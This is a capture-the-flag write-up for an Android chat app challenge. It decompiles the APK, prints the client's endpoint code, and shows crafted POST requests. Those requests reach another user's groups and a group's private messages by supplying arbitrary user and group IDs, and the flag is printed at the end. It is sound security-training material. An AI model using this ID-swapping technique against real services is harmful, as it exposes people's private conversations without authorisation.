# Chatwurst

Start the challenge by opening up the chatwurst.apk in jadx:
`jadx-gui`

After navigating around the files, you'll see under Source code/com/sinclustoapps.chat there's a file:
`ChatwurstClient`

This file contains the POST requests that the application uses to make users, login, make groups and join groups

```java
public static void createUser(Context context, String str, String str2, Listener listener) {
        HashMap hashMap = new HashMap();
        hashMap.put("username", str);
        hashMap.put("password", str2);
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/create_user", new JSONObject(hashMap), listener);
    }

    public static void loginUser(Context context, String str, String str2, Listener listener) {
        HashMap hashMap = new HashMap();
        hashMap.put("username", str);
        hashMap.put("password", str2);
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/login", new JSONObject(hashMap), listener);
    }

    public static void createGroup(Context context, String str, String str2, ArrayList<String> arrayList, Listener listener) {
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap2.put("username", str);
        hashMap2.put("password", str2);
        hashMap.put("credential", hashMap2);
        int i = 0;
        while (i < 10 && i < arrayList.size()) {
            hashMap.put("user_" + Integer.toString(i), arrayList.get(i));
            i++;
        }
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/create_group", new JSONObject(hashMap), listener);
    }

    public static void createMessage(Context context, String str, String str2, int i, String str3, Listener listener) {
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap2.put("username", str);
        hashMap2.put("password", str2);
        hashMap.put("credential", hashMap2);
        hashMap.put("group_id", Integer.valueOf(i));
        hashMap.put("content", str3);
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/create_message", new JSONObject(hashMap), listener);
    }

    public static void getGroups(Context context, String str, String str2, int i, Listener listener) {
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap2.put("username", str);
        hashMap2.put("password", str2);
        hashMap.put("credential", hashMap2);
        hashMap.put("user_id", Integer.valueOf(i));
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/get_groups", new JSONObject(hashMap), listener);
    }

    public static void getMessages(Context context, String str, String str2, int i, Listener listener) {
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap2.put("username", str);
        hashMap2.put("password", str2);
        hashMap.put("credential", hashMap2);
        hashMap.put("group_id", Integer.valueOf(i));
        makePostRequest(context, "http://chatwurst.ctf-league.osusec.org/get_messages", new JSONObject(hashMap), listener);  
}
```

The functions we are interested in with this app are the getMessages and getGroups functions since we want to be able to read the messages that are in a certain group.

First we must create a user so that we are able to submit requests with our credentials.
In the createUser function, it sends a POST request to: http://chatwurst.ctf-league.osusec.org/create_user
The content in the request consists of a username and password, so I created a POST request in https://reqbin.com 
```
URL: http://chatwurst.ctf-league.osusec.org/create_user
Content: {"username":"balll", "password":"test"}
```
Next we see that the getGroups function uses a username and password hashmap as a credential then a user_id to get the groups that the user is affiliated with. I assumed the user_id for the FizzbuzzMcFlurry account was a low number so I chose 1 as the user_id:
```
URL: http://chatwurst.ctf-league.osusec.org/get_groups
Content: {"credential":{"username":"ball","password":"test"}, "user_id": 1}
```

After recieving the group list of the user, I found there was a group with a bunch of users: Group 9
So the next step was to read the messages from the group. That's where the getMessages function comes along.
The getMessages function sends a POST request to http://chatwurst.ctf-league.osusec.org/get_messages with the credentials and a group id. So I created another POST request with this info.

```
URL: http://chatwurst.ctf-league.osusec.org/get_messages
Content: {"credential":{"username":"ball","password":"test"}, "group_id": 9}
```
This returned a list of all the messages in the group. Inside this message was the flag.

osu{cH4TWUrst_m0RE_L1KE_wUrSt_ch47}
